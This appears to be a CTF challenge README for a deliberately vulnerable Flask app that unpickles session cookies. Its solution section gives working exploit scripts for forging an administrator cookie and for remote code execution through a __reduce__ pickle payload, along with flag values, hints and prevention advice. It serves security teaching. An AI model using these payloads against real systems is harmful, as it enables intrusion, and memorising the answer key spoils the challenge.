# Deserialization Session Challenge

**Status:** ✅ Complete

## Player Description

EverSec's Premium Session Manager™ uses Python's pickle module because our lead developer said it's "as reliable as your grandmother's pickles!" We serialize your entire session object and store it in a cookie. When you return, we just unpickle it - like magic! Some people worry about "arbitrary code execution" during unpickling, but we think they're just scaremongers. It's not like you would send us a malicious pickle - you seem trustworthy! Besides, our cookie is base64 encoded, and we already established that base64 is basically encryption. We're three layers of security deep here, people!

## Technical Description

**Category:** Web / Deserialization
**Difficulty:** Hard
**Points:** 900 (400 + 500)

A Flask web application that uses Python's pickle module to serialize and deserialize user session data. This challenge demonstrates the severe security risks of deserializing untrusted data, which can lead to arbitrary code execution.

## Challenge Information

- **Port:** 4008
- **URL:** http://localhost:4008

## Objective

Exploit insecure deserialization to:
1. **FLAG 1** (400 points): Manipulate the session cookie to escalate privileges to administrator
2. **FLAG 2** (500 points): Achieve remote code execution by crafting a malicious pickle payload

## Background: What is Deserialization?

Serialization is the process of converting an object into a format that can be stored or transmitted. Deserialization is the reverse process. Python's `pickle` module is commonly used for this purpose, but it has a critical security flaw: **pickle can execute arbitrary code during deserialization**.

When an application deserializes user-controlled data with pickle, an attacker can inject malicious code that executes on the server.

## The Vulnerability

The application has two critical flaws:

### 1. Insecure Session Management (app.py:34-50)

```python
def serialize_session(session_obj):
    # VULNERABLE: Using pickle to serialize user-controlled data
    pickled = pickle.dumps(session_obj)
    return base64.b64encode(pickled).decode('utf-8')

def deserialize_session(session_data):
    # VULNERABLE: Unpickling untrusted data
    decoded = base64.b64decode(session_data)
    session_obj = pickle.loads(decoded)  # DANGEROUS!
    return session_obj
```

### 2. Cookie-Based Authentication (app.py:89-109)

The application stores session data in a client-side cookie and deserializes it on every request without validation. An attacker can:
- Decode the base64-encoded pickle data
- Modify the session object (e.g., change role to "administrator")
- Create a malicious pickle payload that executes code
- Re-encode and send it back to the server

## Setup

### Using Docker Compose (Recommended)

From the project root directory:

```bash
docker compose up -d deserialization-session
```

The challenge will be available at http://localhost:4008

### Using Docker Directly

From this directory:

```bash
docker build -t deserialization-session .
docker run -p 4008:4008 \
  -e FLAG1="d3s3r14l1z4t10n_d3t3ct3d" \
  -e FLAG2="p1ckl3_rc3_4ch13v3d" \
  deserialization-session
```

### Local Development

```bash
pip install -r requirements.txt
export FLAG1="d3s3r14l1z4t10n_d3t3ct3d"
export FLAG2="p1ckl3_rc3_4ch13v3d"
python app.py
```

## Solution

<details>
<summary>Click to reveal solution</summary>

### Phase 1: Understanding the Session Format

#### Step 1: Login and Capture Session

1. Navigate to http://localhost:4008/login
2. Login with any credentials where username equals password (e.g., `test` / `test`)
3. Capture the `session` cookie from your browser (DevTools → Application → Cookies)

The cookie is a base64-encoded pickle object.

#### Step 2: Decode the Session

```python
import pickle
import base64

# Example session cookie
session_cookie = "gASVRQAAAAAAAACMCF9fbWFpbl9flIwLVXNlclNlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwEdGVzdJSMBHJvbGWUjAR1c2VylIwNYXV0aGVudGljYXRlZJSIjApjcmVhdGVkX2F0lIwaMjAyNi0wMS0xOVQxMjozNDo1Ni4xMjM0NTaUdWIu"

# Decode base64
decoded = base64.b64decode(session_cookie)

# Unpickle (DANGEROUS - only for analysis)
session_obj = pickle.loads(decoded)

print(f"Username: {session_obj.username}")
print(f"Role: {session_obj.role}")
print(f"Authenticated: {session_obj.authenticated}")
```

### Phase 2: FLAG 1 - Privilege Escalation

#### Step 3: Modify Session to Administrator

```python
#!/usr/bin/env python3
import pickle
import base64
import requests

BASE_URL = "http://localhost:4008"

# Create a UserSession class matching the server
class UserSession:
    def __init__(self, username, role='user', authenticated=False):
        self.username = username
        self.role = role
        self.authenticated = authenticated
        self.created_at = "2026-01-19T12:00:00.000000"

# Create admin session
admin_session = UserSession(
    username="attacker",
    role="administrator",  # Changed from "user" to "administrator"
    authenticated=True
)

# Serialize to pickle and encode
pickled = pickle.dumps(admin_session)
malicious_cookie = base64.b64encode(pickled).decode('utf-8')

print(f"[+] Malicious cookie: {malicious_cookie}")

# Send request with modified cookie
session = requests.Session()
session.cookies.set('session', malicious_cookie)

response = session.get(f"{BASE_URL}/dashboard")

# Extract FLAG 1
if "FLAG{" in response.text:
    import re
    flag = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag:
        print(f"\n🚩 FLAG 1: {flag.group(0)}")
```

Alternatively, you can use the API endpoint:

```bash
curl -X POST http://localhost:4008/api/validate \
  -H "Content-Type: application/json" \
  -d '{"session": "YOUR_MODIFIED_COOKIE_HERE"}'
```

### Phase 3: FLAG 2 - Remote Code Execution

#### Step 4: Craft Malicious Pickle Payload

Python pickle supports special methods like `__reduce__` that can execute arbitrary code during deserialization. The challenge has a dedicated `/api/execute` endpoint that deserializes the session payload and returns command output directly in the response.

```python
#!/usr/bin/env python3
import pickle
import base64
import subprocess
import urllib.request
import json

# Build malicious pickle that captures output via subprocess
class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/home/ctfuser/flag2.txt'],))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()

# POST to /api/execute
data = json.dumps({'session': payload}).encode()
req = urllib.request.Request('http://localhost:4008/api/execute', data=data, method='POST')
req.add_header('Content-Type', 'application/json')
with urllib.request.urlopen(req) as r:
    print(json.loads(r.read())['output'])
```

This uses `subprocess.check_output` directly in `__reduce__`, which captures stdout and returns it to the caller. The `/api/execute` endpoint then includes the output in the JSON response.

#### Step 5: Alternative Payloads

```python
import pickle
import base64
import os

# Alternative using os.popen (output returned as string)
class RCE2:
    def __reduce__(self):
        return (os.popen, ("cat /home/ctfuser/flag2.txt",))

# Note: os.popen returns a file object, not a string — subprocess is preferred
```

### Complete Exploit Script

```python
#!/usr/bin/env python3
import pickle
import base64
import subprocess
import urllib.request
import urllib.parse
import json

BASE_URL = "http://localhost:4008"

print("=" * 60)
print("Pickle Deserialization Exploit")
print("=" * 60)

# FLAG 1: Privilege Escalation
print("\n[Phase 1] Privilege Escalation to Administrator")
print("-" * 60)

class UserSession:
    def __init__(self, username, role='user', authenticated=False):
        self.username = username
        self.role = role
        self.authenticated = authenticated
        self.created_at = "2026-01-19T12:00:00"

admin_session = UserSession("hacker", "administrator", True)
cookie = base64.b64encode(pickle.dumps(admin_session)).decode()

data = json.dumps({'session': cookie}).encode()
req = urllib.request.Request(f"{BASE_URL}/api/validate", data=data, method='POST')
req.add_header('Content-Type', 'application/json')
with urllib.request.urlopen(req) as r:
    result = json.loads(r.read())
    if result.get('flag'):
        print(f"🚩 FLAG 1: {result['flag']}")

# FLAG 2: Remote Code Execution via /api/execute
print("\n[Phase 2] Remote Code Execution")
print("-" * 60)

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/home/ctfuser/flag2.txt'],))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()

data = json.dumps({'session': payload}).encode()
req = urllib.request.Request(f"{BASE_URL}/api/execute", data=data, method='POST')
req.add_header('Content-Type', 'application/json')
with urllib.request.urlopen(req) as r:
    result = json.loads(r.read())
    print(f"🚩 FLAG 2: {result.get('output', '').strip()}")

print("\n" + "=" * 60)
```

</details>

## Learning Objectives

After completing this challenge, you should understand:

1. **Pickle Security Risks**: Why pickle should never be used with untrusted data
2. **Deserialization Attacks**: How object deserialization can lead to RCE
3. **Python Magic Methods**: How `__reduce__` enables code execution
4. **Session Management**: Proper vs improper session handling
5. **Attack Chains**: Combining session manipulation with RCE
6. **Defense Strategies**: How to safely handle serialization

## Common Pitfalls

1. **Incorrect pickle format**: Ensure proper base64 encoding
2. **Class definition mismatch**: Your UserSession class must match the server's
3. **Payload not executing**: Some payloads may need specific Python versions
4. **Timeout issues**: RCE payloads may cause the request to hang

## Hints

> These hints are for CTF administrators helping stuck players. Share them progressively — start with Hint 1.

<details>
<summary>Hint 1</summary>

Decode your session cookie from base64 and look at the raw bytes. Python's `pickle` format has a recognizable binary structure. If the server deserializes this cookie without validation, what can an attacker-controlled input do?

</details>

<details>
<summary>Hint 2</summary>

Python's `pickle` deserialization is dangerous because of a specific mechanism. Research what `__reduce__` does and why deserializing untrusted pickle data leads to arbitrary code execution.

</details>

<details>
<summary>Hint 3</summary>

With code execution as the app user, what Linux privilege escalation techniques would a pentester explore to move toward root access?

</details>

## Prevention

### Never Use Pickle with Untrusted Data

```python
# INSECURE - Never do this
session_data = pickle.loads(user_cookie)

# SECURE - Use JSON for session data
import json
session_data = json.loads(user_cookie)
```

### Use Signed Sessions

```python
# Use Flask's built-in secure sessions
from flask import session

app.secret_key = 'cryptographically-strong-secret-key'

# Flask handles serialization securely with signing
@app.route('/login', methods=['POST'])
def login():
    session['username'] = username
    session['role'] = 'user'
    # Flask signs this data to prevent tampering
```

### Secure Serialization Alternatives

```python
# Option 1: JSON with signing (Flask default)
from itsdangerous import TimestampSigner
signer = TimestampSigner(secret_key)
signed_data = signer.sign(json.dumps(session_data))

# Option 2: Store sessions server-side
from flask_session import Session
app.config['SESSION_TYPE'] = 'redis'  # or 'sqlalchemy', 'filesystem'

# Option 3: JWT with proper verification
import jwt
token = jwt.encode({'user': 'john', 'role': 'user'}, secret_key, algorithm='HS256')
```

### General Best Practices

1. **Never deserialize untrusted data** with pickle, PyYAML (with Loader), or similar
2. **Use JSON** for data serialization when possible
3. **Store sensitive session data server-side** (Redis, database)
4. **Sign all client-side data** to detect tampering
5. **Implement proper authentication** with secure session management
6. **Regular security audits** of serialization code

## References

- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [Python Pickle Security](https://docs.python.org/3/library/pickle.html#module-pickle)
- [Exploiting Pickle](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
- [Flask Session Security](https://flask.palletsprojects.com/en/2.3.x/quickstart/#sessions)
